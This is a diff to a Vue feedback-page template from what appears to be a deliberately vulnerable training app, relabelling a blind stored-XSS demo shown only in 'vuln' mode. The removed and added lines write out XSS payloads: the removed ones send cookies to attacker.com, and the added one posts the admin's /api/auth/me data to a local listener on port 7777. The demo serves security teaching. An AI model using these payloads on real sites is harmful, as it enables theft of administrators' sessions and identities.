@@ -32,14 +32,14 @@
           </el-form-item>
         </el-form>
         
-        <!-- XSS 提示（L3 盲 XSS）：仅在 VULN 模式展示攻击示例 -->
+        <!-- XSS 提示（场景 5 盲 XSS）：仅在 VULN 模式展示攻击示例 -->
         <div class="demo-info" v-if="configStore.xssMode === 'vuln'">
-          <h3>⚠️ 盲 XSS 演示（L3）</h3>
+          <h3>⚠️ 盲 XSS 演示（场景 5）</h3>
           <p>此表单的内容将被保存到数据库，当管理员在后台查看时触发 XSS。</p>
-          <p>尝试提交以下载荷：</p>
-          <code>&lt;img src=x onerror="fetch('https://attacker.com/cookie?c='+document.cookie)"&gt;</code>
+          <p>尝试提交以下载荷（窃取管理员身份）：</p>
+          <code>&lt;img src=x onerror="fetch('/api/auth/me').then(r=&gt;r.json()).then(j=&gt;{new Image().src='http://127.0.0.1:7777/x?d='+btoa(JSON.stringify(j));});"&gt;</code>
           <p style="margin-top: 12px;">或更隐蔽的方式：</p>
-          <code>&lt;script&gt;fetch('https://attacker.com/admin-data?cookie='+document.cookie+'&url='+location.href)&lt;/script&gt;</code>
+          <code>&lt;img src=x onerror="fetch('/api/auth/me').then(r=&gt;r.json()).then(j=&gt;{console.log('管理员:',j);});"&gt;</code>
         </div>
       </div>
     </div>
@@ -47,7 +47,7 @@
 </template>
 
 <script setup>
-// 反馈页（L3）：演示盲 XSS
+// 反馈页（场景 5）：演示盲 XSS
 // - 用户提交的富文本会被存入数据库
 // - 管理员在后台查看详情时触发（VULN）/被拦截（SECURE）
 import { ref } from 'vue';
